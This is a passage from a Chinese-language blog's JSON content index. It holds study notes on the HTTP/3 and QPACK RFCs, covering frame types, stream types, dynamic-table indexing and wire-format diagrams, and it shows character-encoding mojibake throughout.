æœ¬æ–‡æ¡£å®šä¹‰äº†æ§åˆ¶æµå’Œpushæµï¼Œæ¯ä¸ªç«¯ç‚¹éœ€è¦ä¸ºHTTPæ§åˆ¶æµåˆ›å»ºè‡³å°‘ä¸€ä¸ªå•å‘æµï¼ŒQPACKéœ€è¦ä¸¤ä¸ªé¢å¤–çš„å•å‘æµï¼Œå› æ­¤server clientå‘é€çš„ä¼ è¾“å‚æ•°å¿…é¡»å…è®¸å¯¹ç­‰ç«¯åˆ›å»ºè‡³å°‘ä¸‰ä¸ªå•é¡¹æµã€‚\nControl Streams\næ§åˆ¶æµç”±0x00è¡¨ç¤ºï¼Œè¯¥æµä¸Šçš„æ•°æ®ç”±HTTP3 framesç»„æˆ\næ¯ä¸€æ–¹å¿…é¡»åœ¨è¿æ¥å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªæ§åˆ¶æµï¼Œå¹¶å°†å…¶SETTINGS frameä½œä¸ºç¬¬ä¸€ä¸ªframeå‘é€\nPush Streams\næ¨é€æµç”±0x01è¡¨ç¤ºï¼Œåé¢è·Ÿç€ä»–é”å®ç°çš„æ‰¿è¯ºçš„push IDï¼Œç¼–ç ä¸ºè¾¹é•¿æ•´å‹ï¼Œè¯¥æµå‰©ä½™æ•°æ®åˆHTTP3 framesç»„æˆ\npush stream header:\n1 2 3 4 Push Stream Header { Stream Type (i) = 0x01, Push ID (i), } Reserved Stream Types\nç¬¬ä¸ƒç« ã€HTTP Framing Layer ä¸‹è¡¨è¡¨ç¤ºHTTP3 frameså’Œä»–ä»¬å…è®¸çš„æµç±»å‹\nFrame Control Stream Request Stream Push Stream Section DATA No Yes Yes Section 7.2.1 HEADERS No Yes Yes Section 7.2.2 CANCEL_PUSH Yes No No Section 7.2.3 SETTINGS Yes (1) No No Section 7.2.4 PUSH_PROMISE No Yes No Section 7.2.5 GOAWAY Yes No No Section 7.2.6 MAX_PUSH_ID Yes No No Section 7.2.7 Reserved Yes Yes Yes Section 7.2.8 Frame Layout æ‰€æœ‰çš„frameæœ‰ä¸‹é¢çš„æ ¼å¼\n1 2 3 4 5 HTTP/3 Frame Format { Type (i), Length (i), Frame Payload (..), } Type:å˜é•¿æ•´æ•°è¡¨ç¤ºframesç±»å‹\nLength:è¾¹é•¿æ•´æ•°è¡¨ç¤ºframesé•¿åº¦\nFrame Payload:æ•°æ®\nFrame Definitions DATA\nDATA frame 0x00 å¯å˜é•¿å­—èŠ‚åºåˆ—\n1 2 3 4 5 DATA Frame { Type (i) = 0x00, Length (i), Data (..), } HEADERS\nheaders 0x01 ç”¨äºæºå¸¦QPACKç¼–ç çš„HTTP fields\n1 2 3 4 5 HEADERS Frame { Type (i) = 0x01, Length (i), Encoded Field Section (..), } headers frame åªèƒ½åœ¨è¯·æ±‚æµæˆ–è€…push streamä¸­å‘é€\nCANCEL_PUSH\ncancel_push 0x03 ç”¨æ¥åœ¨æ¥æ”¶åˆ°æ¨é€æµä¹‹å‰å–æ¶ˆserver push\nclientå‘é€è¡¨ç¤ºä¸æƒ³è¦\nserverå‘é€è¡¨ç¤ºä¸ä¼šå±¥è¡Œæ‰¿è¯º\næºå¸¦ä¸€ä¸ªpush IDï¼Œæ ‡è¯†è¢«å–æ¶ˆçš„server push\n1 2 3 4 5 CANCEL_PUSH Frame { Type (i) = 0x03, Length (i), Push ID (i), } Settings\nsettings 0x04 ä¼ é€’é…ç½®å‚æ•° æ¯”å¦‚å¯¹ç­‰è¡Œä¸ºçš„åå¥½å’Œçº¦æŸï¼Œåº”ç”¨äºæ•´ä¸ªHTTP3è¿æ¥è€Œä¸æ˜¯æ•´ä¸ªæµ\nsettings frameåªèƒ½åœ¨control streamä¸Šå‘é€\n1 2 3 4 5 6 7 8 9 10 Setting { Identifier (i), Value (i), } SETTINGS Frame { Type (i) = 0x04, Length (i), Setting (..) ..., } å¿½ç•¥æ‰€æœ‰ä¸ç†è§£çš„æ ‡è¯†ç¬¦å‚æ•°\nPUSH_PROMISE\npush_promise 0x05 ç”¨äºåœ¨è¯·æ±‚æµä¸­æºå¸¦ä»æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„è¢«æ‰¿è¯ºçš„è¯·æ±‚æŠ¥å¤´ç‰‡æ®µ\n1 2 3 4 5 6 PUSH_PROMISE Frame { Type (i) = 0x05, Length (i), Push ID (i), Encoded Field Section (..), } encoded field sectionè¢«æ‰¿è¯ºå“åº”çš„QPACKè¯·æ±‚æŠ¥å¤´å­—æ®µ\nå®¢æˆ·ç«¯ç»å¯¹ä¸èƒ½å‘é€PUSH_PROMISE frame\nGOAWAY\nGOAWAY frame 0x07 ç”¨äºå¯åŠ¨HTTP3è¿æ¥çš„ä»»æ„æ–­ç‚¹çš„ä¼˜é›…å…³é—­\n1 2 3 4 5 GOAWAY Frame { Type (i) = 0x07, Length (i), Stream ID/Push ID (i), } åªèƒ½åœ¨æ§åˆ¶æµä¸Šä¼ è¾“ï¼Œåº”ç”¨äºæ•´ä¸ªè¿æ¥\nMAX_PUSH_ID\nmax_push_id 0x0d è¢«å®¢æˆ·ç«¯ç”¨æ¥æ§åˆ¶æœåŠ¡å™¨å¯ä»¥å‘èµ·çš„æœåŠ¡å™¨æ¨é€æ•°é‡ã€‚\nåªèƒ½åœ¨æ§åˆ¶æµä¸Šå‘é€ï¼Œserverä¸èƒ½å‘é€ï¼Œserveråœ¨æ”¶åˆ°MAX_PUSH_IDå‰ä¸èƒ½æ¨é€ï¼Œframeæºå¸¦ä¸€ä¸ªè¾¹é•¿æ•´æ•°ç”¨æ¥æ ‡è¯†serverå¯ä»¥ä½¿ç”¨çš„æ¨é€IDæœ€å¤§å€¼ã€‚\n1 2 3 4 5 MAX_PUSH_ID Frame { Type (i) = 0x0d, Length (i), Push ID (i), } Reserved Frame Types\nRFC9204 å¯ä»¥åœ¨quic-goæºç ä¸­çœ‹åˆ°å…¶handleConnä¸­ç¬¬ä¸€æ­¥å°±æ˜¯qpack.NewDecoder(nil)åˆ›å»ºä¸€ä¸ªqpack decoder\nå…¶ä½¿ç”¨çš„åº“æ˜¯\u0026quot;github.com/marten-seemann/qpack\u0026quot;,è€Œqpackä¹Ÿæ˜¯RFC9204è§„å®šçš„HTTP/3çš„å­—æ®µå‹ç¼©æ–¹å¼\nAbstract è¯¥è§„èŒƒå®šä¹‰äº† QPACKï¼šä¸€ç§ç”¨äºæœ‰æ•ˆè¡¨ç¤ºå°†åœ¨ HTTP/3 ä¸­ä½¿ç”¨çš„ HTTP å­—æ®µçš„å‹ç¼©æ ¼å¼ã€‚è¿™æ˜¯ HPACK å‹ç¼©çš„ä¸€ç§å˜ä½“ï¼Œæ—¨åœ¨å‡å°‘è¡Œå¤´é˜»å¡(HOL blocking)\n2ã€å‹ç¼©è¿‡ç¨‹æ¦‚è¿° ä¸HPACKç›¸ä¼¼ï¼ŒQPACKä½¿ç”¨ä¸¤ä¸ªè¡¨(ç¬¬ä¸‰ç« çš„Static tableå’ŒDynamic table)å°†å­—æ®µè¡Œ(â€œå¤´â€)ä¸ç´¢å¼•ç›¸å…³è”ã€‚Static tableæ˜¯é¢„å®šä¹‰çš„ï¼ŒåŒ…å«å¸¸è§çš„å¤´å­—æ®µè¡Œ(å…¶ä¸­ä¸€äº›æ˜¯ç©ºå€¼)ã€‚Dynamic tableåŠ¨æ€è¡¨æ˜¯åœ¨è¿æ¥è¿‡ç¨‹ä¸­å»ºç«‹çš„ï¼ŒEncoderç¼–ç å™¨å¯ä»¥ä½¿ç”¨å®ƒæ¥ç´¢å¼•ç¼–ç å­—æ®µæ®µä¸­çš„å¤´å­—æ®µè¡Œå’Œå°¾å­—æ®µè¡Œã€‚\nQPACKå®šä¹‰äº†å•å‘æµï¼Œç”¨äºå°†æŒ‡ä»¤ä»ç¼–ç å™¨å‘é€åˆ°è§£ç å™¨ï¼Œåä¹‹äº¦ç„¶ã€‚\n2.1ã€Encoder ç¼–ç å™¨é€šè¿‡ä¸ºåˆ—è¡¨ä¸­çš„æ¯ä¸ªå­—æ®µè¡Œå‘å‡ºç´¢å¼•æˆ–æ–‡å­—è¡¨ç¤ºï¼Œå°†å¤´éƒ¨æˆ–å°¾éƒ¨éƒ¨åˆ†è½¬æ¢ä¸ºä¸€ç³»åˆ—è¡¨ç¤º;å‚è§4.5èŠ‚ã€‚ç´¢å¼•è¡¨ç¤ºé€šè¿‡ç”¨é™æ€æˆ–åŠ¨æ€è¡¨çš„ç´¢å¼•æ›¿æ¢æ–‡å­—åç§°å’Œå¯èƒ½çš„å€¼æ¥å®ç°é«˜å‹ç¼©ã€‚å¯¹é™æ€è¡¨å’Œæ–‡å­—è¡¨ç¤ºçš„å¼•ç”¨ä¸éœ€è¦ä»»ä½•åŠ¨æ€çŠ¶æ€ï¼Œè€Œä¸”æ°¸è¿œä¸ä¼šæœ‰è¡Œé¦–é˜»å¡çš„é£é™©ã€‚å¦‚æœç¼–ç å™¨æ²¡æœ‰æ”¶åˆ°è¡¨ç¤ºè¯¥æ¡ç›®åœ¨è§£ç å™¨ä¸­æ˜¯å¯ç”¨çš„ç¡®è®¤ä¿¡æ¯ï¼Œåˆ™å¼•ç”¨åŠ¨æ€è¡¨å¯èƒ½ä¼šå¯¼è‡´è¡Œé¦–é˜»å¡\nç¼–ç å™¨å¯ä»¥åœ¨å®ƒé€‰æ‹©çš„åŠ¨æ€è¡¨ä¸­æ’å…¥ä»»ä½•æ¡ç›®ï¼Œä¸å±€é™äºä»–åœ¨å‹ç¼©çš„å­—æ®µè¡Œã€‚\nQPACKä¿ç•™äº†æ¯ä¸ªå­—æ®µéƒ¨åˆ†ä¸­å­—æ®µè¡Œçš„é¡ºåºã€‚ç¼–ç å™¨å¿…é¡»æŒ‰ç…§å­—æ®µåœ¨è¾“å…¥å­—æ®µéƒ¨åˆ†ä¸­å‡ºç°çš„é¡ºåºå‘å‡ºå­—æ®µè¡¨ç¤ºã€‚\nQPACKçš„è®¾è®¡ç›®çš„æ˜¯å°†å¯é€‰çŠ¶æ€è·Ÿè¸ªçš„è´Ÿæ‹…æ”¾åœ¨ç¼–ç å™¨ä¸Šï¼Œä»è€Œäº§ç”Ÿç›¸å¯¹ç®€å•çš„è§£ç å™¨\n2.1.1.åŠ¨æ€è¡¨æ’å…¥çš„é™åˆ¶\n2.1.2.é˜»å¡æµ\n2.1.3.é¿å…æµæ§åˆ¶æ­»é”\n2.1.4.å·²çŸ¥æ¥æ”¶è®¡æ•°\nå·²çŸ¥æ¥æ”¶è®¡æ•°æ˜¯è§£ç å™¨ç¡®è®¤çš„åŠ¨æ€è¡¨æ’å…¥å’Œé‡å¤çš„æ€»æ•°ã€‚ç¼–ç å™¨è·Ÿè¸ªå·²çŸ¥çš„æ¥æ”¶è®¡æ•°ï¼Œä»¥ä¾¿è¯†åˆ«å“ªäº›åŠ¨æ€è¡¨æ¡ç›®å¯ä»¥è¢«å¼•ç”¨ï¼Œè€Œä¸ä¼šæ½œåœ¨åœ°é˜»å¡æµã€‚è§£ç å™¨è·Ÿè¸ªå·²çŸ¥çš„æ¥æ”¶è®¡æ•°ï¼Œä»¥ä¾¿èƒ½å¤Ÿå‘é€æ’å…¥è®¡æ•°å¢é‡æŒ‡ä»¤ã€‚\nAcknowledgmentæŒ‡ä»¤(ç« èŠ‚4.4.1)æ„å‘³ç€è§£ç å™¨å·²ç»æ”¶åˆ°äº†è§£ç å­—æ®µSectionæ‰€éœ€çš„æ‰€æœ‰åŠ¨æ€è¡¨çŠ¶æ€ã€‚å¦‚æœç¡®è®¤å­—æ®µéƒ¨åˆ†çš„â€œæ‰€éœ€æ’å…¥è®¡æ•°â€å¤§äºå½“å‰çš„â€œå·²çŸ¥æ¥æ”¶è®¡æ•°â€ï¼Œåˆ™â€œå·²çŸ¥æ¥æ”¶è®¡æ•°â€å°†æ›´æ–°ä¸ºâ€œæ‰€éœ€æ’å…¥è®¡æ•°â€å€¼ã€‚(Known Received Count/Required Insert Count)\næ’å…¥è®¡æ•°é€’å¢æŒ‡ä»¤(ç¬¬4.4.3èŠ‚)é€šè¿‡å…¶é€’å¢å‚æ•°é€’å¢å·²çŸ¥æ¥æ”¶è®¡æ•°ã€‚\n2.2ã€Decoder ä¸HPACKä¸€æ ·ï¼Œè§£ç å™¨å¤„ç†ä¸€ç³»åˆ—è¡¨ç¤ºå¹¶å‘å‡ºç›¸åº”çš„å­—æ®µéƒ¨åˆ†ã€‚å®ƒè¿˜å¤„ç†ä»ç¼–ç å™¨æµæ¥æ”¶åˆ°çš„ä¿®æ”¹åŠ¨æ€è¡¨çš„æŒ‡ä»¤ã€‚è¯·æ³¨æ„ï¼Œç¼–ç å­—æ®µéƒ¨åˆ†å’Œç¼–ç å™¨æµæŒ‡ä»¤åœ¨ä¸åŒçš„æµä¸Šåˆ°è¾¾ã€‚è¿™ä¸HPACKä¸åŒï¼Œåœ¨HPACKä¸­ï¼Œç¼–ç å­—æ®µéƒ¨åˆ†(å¤´å—)å¯ä»¥åŒ…å«ä¿®æ”¹åŠ¨æ€è¡¨çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”æ²¡æœ‰HPACKæŒ‡ä»¤çš„ä¸“ç”¨æµã€‚\nè§£ç å™¨å¿…é¡»æŒ‰å­—æ®µè¡¨ç¤ºåœ¨ç¼–ç å­—æ®µéƒ¨åˆ†ä¸­å‡ºç°çš„é¡ºåºå‘å‡ºå­—æ®µè¡Œã€‚\n2.2.1.é˜»å¡è§£ç \n2.2.2.çŠ¶æ€åŒæ­¥\n2.2.3.æ— æ•ˆå‚è€ƒ\n3ã€Reference Tables ä¸HPACKä¸åŒï¼ŒQPACKé™æ€è¡¨å’ŒåŠ¨æ€è¡¨ä¸­çš„æ¡ç›®æ˜¯åˆ†åˆ«å¯»å€çš„ã€‚ä¸‹é¢çš„éƒ¨åˆ†æè¿°äº†æ¯ä¸ªè¡¨ä¸­çš„æ¡ç›®æ˜¯å¦‚ä½•å¯»å€çš„\n3.1ã€Static Table é™æ€è¡¨ç”±é¢„å®šä¹‰çš„å­—æ®µè¡Œåˆ—è¡¨ç»„æˆï¼Œæ¯æ¡å­—æ®µè¡Œéƒ½æœ‰ä¸€ä¸ªéšæ—¶é—´å˜åŒ–çš„å›ºå®šç´¢å¼•ã€‚\né™æ€è¡¨ä¸­çš„æ‰€æœ‰æ¡ç›®éƒ½æœ‰ä¸€ä¸ªåç§°å’Œä¸€ä¸ªå€¼ã€‚ä½†æ˜¯ï¼Œå€¼å¯ä»¥ä¸ºç©º(å³é•¿åº¦ä¸º0)ã€‚æ¯ä¸ªæ¡ç›®ç”±å”¯ä¸€çš„ç´¢å¼•æ ‡è¯†\nQPACKä»0å¼€å§‹ç´¢å¼• HPACKä»1å¼€å§‹ç´¢å¼•\n3.2ã€Dynamic Table åŠ¨æ€è¡¨ç”±ä¸€ä¸ªä»¥å…ˆè¿›å…ˆå‡ºçš„é¡ºåºç»´æŠ¤çš„å­—æ®µè¡Œåˆ—è¡¨ç»„æˆã€‚QPACKç¼–ç å™¨å’Œè§£ç å™¨å…±äº«ä¸€ä¸ªæœ€åˆä¸ºç©ºçš„åŠ¨æ€è¡¨ã€‚ç¼–ç å™¨å°†æ¡ç›®æ·»åŠ åˆ°åŠ¨æ€è¡¨ä¸­ï¼Œå¹¶é€šè¿‡ç¼–ç å™¨æµä¸Šçš„æŒ‡ä»¤å°†å®ƒä»¬å‘é€ç»™è§£ç å™¨\nå¯ä»¥æœ‰é‡å¤æ¡ç›®ï¼Œè¡¨é¡¹å¯ä»¥æœ‰ç©ºå€¼ã€‚\n3.2.1. Dynamic Table Size\nsize = len(name) + len(value) + 32\n3.2.2. Dynamic Table Capacity and Eviction\nç¼–ç å™¨è®¾ç½®åŠ¨æ€è¡¨çš„å®¹é‡ä½œä¸ºå…¶æœ€å¤§å€¼ åˆå§‹å®¹é‡ä¸º0 ç¼–ç å™¨å‘é€ä¸€ä¸ªå…·æœ‰éé›¶å€¼çš„Set Dynamic Table CapacityæŒ‡ä»¤å¼€å§‹ä½¿ç”¨åŠ¨æ€è¡¨ã€‚\nå¤§å°ä¸å¤Ÿæ’å…¥å°±ç§»å‡ºä¸€ä¸ªè¡¨é¡¹\næ–°æ¡ç›®å¯ä»¥å¼•ç”¨ä¹‹å‰çš„è¡¨é¡¹ï¼Œè¦æ³¨æ„ç§»å‡ºçš„æ—¶å€™é¿å…ç§»å‡ºè¢«å¼•ç”¨è¡¨é¡¹ã€‚\n3.2.3. Maximum Dynamic Table Capacity\nçº¦æŸè§£ç å™¨å†…å­˜éœ€æ±‚ï¼Œè§£ç å™¨é™åˆ¶ç¼–ç å™¨å…è®¸ä¸ºåŠ¨æ€è¡¨å®¹é‡è®¾ç½®çš„æœ€å¤§å€¼ã€‚ç”±è§£ç å™¨å‘é€çš„SETTING_QPACK_MAX_TABLE_CAPACITYå†³å®šï¼Œç¼–ç å™¨ä¸èƒ½è®¾ç½®è¶…è¿‡è¿™ä¸ªæœ€å¤§å€¼ã€‚\n3.2.4. Absolute Indexing\næ¯ä¸ªæ¡ç›®éƒ½æ‹¥æœ‰ä¸€ä¸ªç»å¯¹ç´¢å¼•ï¼Œè¯¥ç´¢å¼•åœ¨æ¡ç›®çš„ç”Ÿå‘½å‘¨æœŸå†…æ˜¯å›ºå®šçš„ã€‚æ’å…¥çš„ç¬¬ä¸€ä¸ªæ¡ç›®çš„ç»å¯¹ç´¢å¼•ä¸º0;æ¯æ’å…¥ä¸€æ¬¡ï¼Œç´¢å¼•å°±å¢åŠ 1\n3.2.5. Relative Indexing\nç›¸å¯¹ç´¢å¼•ä»é›¶å¼€å§‹ï¼Œå‘ä¸ç»å¯¹æŒ‡æ•°ç›¸åçš„æ–¹å‘å¢é•¿ã€‚ç¡®å®šå“ªä¸ªæ¡ç›®çš„ç›¸å¯¹ç´¢å¼•ä¸º0å–å†³äºå¼•ç”¨çš„ä¸Šä¸‹æ–‡\nåœ¨ç¼–ç å™¨æŒ‡ä»¤(ç« èŠ‚4.3)ä¸­ï¼Œ0çš„ç›¸å¯¹ç´¢å¼•æŒ‡çš„æ˜¯åŠ¨æ€è¡¨ä¸­æœ€è¿‘æ’å…¥çš„å€¼ã€‚æ³¨æ„ï¼Œè¿™æ„å‘³ç€åœ¨è§£é‡Šç¼–ç å™¨æµä¸Šçš„æŒ‡ä»¤æ—¶ï¼Œç»™å®šç›¸å¯¹ç´¢å¼•å¼•ç”¨çš„æ¡ç›®å°†å‘ç”Ÿå˜åŒ–ã€‚\n1 2 3 4 5 6 7 8 9 10 11 +-----+---------------+-------+ | n-1 | ... | d | Absolute Index + - - +---------------+ - - - + | 0 | ... | n-d-1 | Relative Index +-----+---------------+-------+ ^ | | V Insertion Point Dropping Point n = count of entries inserted d = count of entries dropped åŠ¨æ€è¡¨ç´¢å¼•-ç¼–ç å™¨æµ\nä¸ç¼–ç å™¨æŒ‡ä»¤ä¸åŒçš„æ˜¯ï¼Œå­—æ®µè¡Œè¡¨ç¤ºä¸­çš„ç›¸å¯¹ç´¢å¼•ç›¸å¯¹äºè¢«ç¼–ç çš„å­—æ®µè¡Œå¼€å¤´çš„Base;çœ‹åˆ°4.5.1èŠ‚ã€‚è¿™ç¡®ä¿äº†å³ä½¿ç¼–ç å­—æ®µéƒ¨åˆ†å’ŒåŠ¨æ€è¡¨æ›´æ–°è¢«ä¹±åºå¤„ç†ï¼Œå¼•ç”¨ä¹Ÿæ˜¯ç¨³å®šçš„\nåœ¨å­—æ®µè¡Œè¡¨ç¤ºä¸­ï¼Œç›¸å¯¹ç´¢å¼•ä¸º0æŒ‡çš„æ˜¯ç»å¯¹ç´¢å¼•ç­‰äºBase - 1çš„æ¡ç›®\n1 2 3 4 5 6 7 8 9 10 11 12 Base | V +-----+-----+-----+-----+-------+ | n-1 | n-2 | n-3 | ... | d | Absolute Index +-----+-----+ - +-----+ - + | 0 | ... | n-d-3 | Relative Index +-----+-----+-------+ n = count of entries inserted d = count of entries dropped In this example, Base = n - 2 åŠ¨æ€è¡¨ç´¢å¼•ç¤ºä¾‹-è¡¨ç¤ºä¸­çš„ç›¸å¯¹ç´¢å¼•\n3.2.6. Post-Base Indexing\n4ã€Wire Format 4.2. Encoder and Decoder Streams QPACKå®šä¹‰äº†ä¸¤ä¸ªå•é¡¹æµ\n0x02 encoder stream carries an unframed sequence of encoder instructions 0x03 decoder stream carries an unframed sequence of decoder instructions æ¯ä¸ªç«¯ç‚¹å¿…é¡»ä¹Ÿä»…èƒ½å¯åŠ¨ä¸€ä¸ªencoder streamå’Œdecoder stream\n4.3. Encoder æŒ‡ä»¤ 4.3.1. è®¾ç½®Dynamic table capacity\n001å¼€å¤´\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 0 | 1 | Capacity (5+) | +---+---+---+-------------------+ 4.3.2. Insert with Name Reference\n1 2 3 4 5 6 7 8 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 1 | T | Name Index (6+) | +---+---+-----------------------+ | H | Value Length (7+) | +---+---------------------------+ | Value String (Length bytes) | +-------------------------------+ æ’å…¥å­—æ®µè¡Œ Indexed name\n4.3.3. Insert with Literal Name\n1 2 3 4 5 6 7 8 9 10 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 1 | H | Name Length (5+) | +---+---+---+-------------------+ | Name String (Length bytes) | +---+---------------------------+ | H | Value Length (7+) | +---+---------------------------+ | Value String (Length bytes) | +-------------------------------+ æ’å…¥å­—æ®µè¡Œ New name\n4.3.4. Duplicate\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 0 | 0 | Index (5+) | +---+---+---+-------------------+ é‡å¤\n4.4. Decoder æŒ‡ä»¤ 4.4.1. Section Acknowledgment\nåœ¨å¤„ç†äº†ä¸€ä¸ªRequired Insert Countä¸ä¸º0çš„ç¼–ç å­—æ®µæ—¶å›å¤ACK\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 1 | Stream ID (7+) | +---+---------------------------+ 4.4.2. Stream Cancellation\nå½“æµè¢«é‡ç½®æˆ–æ”¾å¼ƒè¯»å–æ—¶ï¼Œå‘é€å–æ¶ˆæŒ‡ä»¤\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 1 | Stream ID (6+) | +---+---+-----------------------+ 4.4.3. Insert Count Increment\nè¯¥æŒ‡ä»¤é€šè¿‡Incrementå‚æ•°çš„å€¼å¢åŠ å·²çŸ¥æ¥æ”¶è®¡æ•°(ç« èŠ‚2.1.4)ã€‚è§£ç å™¨åº”è¯¥å‘é€ä¸€ä¸ªIncrementå€¼ï¼Œå°†å·²çŸ¥æ¥æ”¶è®¡æ•°å¢åŠ åˆ°åˆ°ç›®å‰ä¸ºæ­¢å¤„ç†çš„åŠ¨æ€è¡¨æ’å…¥å’Œé‡å¤çš„æ€»æ•°\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 0 | Increment (6+) | +---+---+-----------------------+ 4.5. Field Line Representations 4.5.1. Encoded Field Section Prefix\n1 2 3 4 5 6 7 8 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | Required Insert Count (8+) | +---+---------------------------+ | S | Delta Base (7+) | +---+---------------------------+ | Encoded Field Lines ... +-------------------------------+ 4.5.1.1. Required Insert Count\n1 2 3 4 if ReqInsertCount == 0: EncInsertCount = 0 else: EncInsertCount = (ReqInsertCount mod (2 * MaxEntries)) + 1 1 MaxEntries = floor( MaxTableCapacity / 32 ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 FullRange = 2 * MaxEntries if EncodedInsertCount == 0: ReqInsertCount = 0 else: if EncodedInsertCount \u0026gt; FullRange: Error MaxValue = TotalNumberOfInserts + MaxEntries # MaxWrapped is the largest possible value of # ReqInsertCount that is 0 mod 2 * MaxEntries MaxWrapped = floor(MaxValue / FullRange) * FullRange ReqInsertCount = MaxWrapped + EncodedInsertCount - 1 # If ReqInsertCount exceeds MaxValue, the Encoder\u0026#39;s value # must have wrapped one fewer time if ReqInsertCount \u0026gt; MaxValue: if ReqInsertCount \u0026lt;= FullRange: Error ReqInsertCount -= FullRange # Value of 0 must be encoded as 0. if ReqInsertCount == 0: Error 4.5.1.2. Base\n1 2 3 4 if Sign == 0: Base = ReqInsertCount + DeltaBase else: Base = ReqInsertCount - DeltaBase - 1 4.5.2. Indexed Field Line\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 1 | T | Index (6+) | +---+---+-----------------------+ 4.5.3. Indexed Field Line with Post-Base Index\n1 2 3 4 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 0 | 0 | 1 | Index (4+) | +---+---+---+---+---------------+ 4.5.4. Literal Field Line with Name Reference\n1 2 3 4 5 6 7 8 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 1 | N | T |Name Index (4+)| +---+---+---+---+---------------+ | H | Value Length (7+) | +---+---------------------------+ | Value String (Length bytes) | +-------------------------------+ 4.5.5. Literal Field Line with Post-Base Name Reference\n1 2 3 4 5 6 7 8 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 0 | 0 | 0 | N |NameIdx(3+)| +---+---+---+---+---+-----------+ | H | Value Length (7+) | +---+---------------------------+ | Value String (Length bytes) | +-------------------------------+ 4.5.6. Literal Field Line with Literal Name\n1 2 3 4 5 6 7 8 9 10 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 0 | 0 | 1 | N | H |NameLen(3+)| +---+---+---+---+---+-----------+ | Name String (Length bytes) | +---+---------------------------+ | H | Value Length (7+) | +---+---------------------------+ | Value String (Length bytes) | +-------------------------------+ Literal Field Line with Literal Name\n","description":"","id":10,"section":"posts","tags":["network","http3"],"title":"QUIC\u0026HTTP3ç›¸å…³RFCæ–‡æ¡£é˜…è¯»","uri":"https://ruokeqx.gitee.io/posts/quichttp3_related_rfc/"},{"content":"HTTPæ¦‚è¿° HTTPæ˜¯äº’è”ç½‘çš„åŸºçŸ³ï¼Œå®ƒçš„ç®€å•ã€çµæ´»ä½¿å¾—å„ç§å„æ ·çš„äº’è”ç½‘åº”ç”¨æˆä¸ºå¯èƒ½ã€‚ä½†HTTPçš„ä¸€äº›å…ˆå¤©ä¸è¶³ä¹Ÿä¸ºåº”ç”¨çš„å¼€å‘å¢åŠ äº†éš¾åº¦ï¼Œä¸ºæ­¤ï¼Œä¸šç•Œå„å¤§å…¬å¸å’Œæ ‡å‡†åŒ–ç»„ç»‡ä¸€ç›´åœ¨å¯¹HTTPåšå„ç§æ”¹è¿›å’Œæ‰©å±•ï¼ŒåŒ…æ‹¬ç¼“å­˜ã€Rangeã€é•¿è¿æ¥ã€Pipeliningï¼Œè¿˜æœ‰åŸºäºSSL/TLSçš„HTTPSã€‚åæ¥Googleè®¾è®¡çš„SPDYåè®®ï¼Œåœ¨HTTPçš„åŸºç¡€ä¸Šå®ç°äº†å¤šè·¯å¤ç”¨å’ŒHeaderå‹ç¼©ï¼Œä»¥è¿›ä¸€æ­¥æ”¹å–„åŸºäºHTTPçš„ä¼ è¾“æ€§èƒ½å’Œåº”ç”¨çš„äº¤äº’ä½“éªŒã€‚SPDYæœ€ç»ˆè¢«IETFæ¥å—å¹¶åšä¸ºHTTP/2çš„åŸºç¡€ã€‚è™½ç„¶å¤šè·¯å¤ç”¨æé«˜äº†æ•°æ®å¹¶å‘ä¼ è¾“çš„æ€§èƒ½ï¼Œä½†ç”±äºSPDYæ˜¯åŸºäºTCPçš„ï¼Œè€ŒTCPä½¿ç”¨çš„æ˜¯ç»Ÿä¸€çš„æµæ§ï¼Œè¿˜æ˜¯å­˜åœ¨Head-of-line blockingçš„é—®é¢˜ã€‚è€Œä¸”TLSå±‚æ¯æ¬¡éƒ½éœ€è¦åå•†å¯†é’¥ï¼Œå¯¼è‡´è¿æ¥å»ºç«‹çš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ä¸”ä½æ•ˆï¼Œæ‰€ä»¥å°±æœ‰äº†QUICåè®®çš„å‡ºç°ã€‚\nä¸ºä»€ä¹ˆä½¿ç”¨UDPï¼Œæƒ³æƒ³éœ€æ±‚å°±å¾ˆç®€å•ï¼Œéœ€è¦çš„æ˜¯ä¸€ä¸ªæ¯”TCPç®€å•ä½†æ˜¯æ¯”UDPåŠŸèƒ½å¤šçš„åè®®ï¼Œæ‰€ä»¥åªèƒ½åŸºäºUDPç”¨æˆ·æ€æ‰©å±•è€Œæ²¡æ³•åŸºäºTCPç²¾ç®€(å› ä¸ºåè®®åœ¨å†…æ ¸ä¸­)ã€‚\nHTTP3çš„ä¼˜åŒ– Head-of-line blocking\nHOL blockingæ˜¯å½“ä¸€è¡Œæ•°æ®åŒ…è¢«ç¬¬ä¸€ä¸ªæ•°æ®åŒ…é˜»å¡åœ¨é˜Ÿåˆ—ä¸­æ—¶å‡ºç°çš„æ€§èƒ½é™åˆ¶ç°è±¡ã€‚HTTP/1.1 ä¸­çš„ä¸€ç§ HOL é˜»å¡å½¢å¼æ˜¯å½“æµè§ˆå™¨ä¸­å…è®¸çš„å¹¶è¡Œè¯·æ±‚æ•°ç”¨å®Œæ—¶ï¼Œåç»­è¯·æ±‚éœ€è¦ç­‰å¾…å‰ä¸€ä¸ªè¯·æ±‚å®Œæˆï¼›HTTP/2 é€šè¿‡è¯·æ±‚å¤ç”¨æ¶ˆé™¤äº†åº”ç”¨å±‚çš„ HOL é˜»å¡ï¼Œä½† HOL åœ¨ä¼ 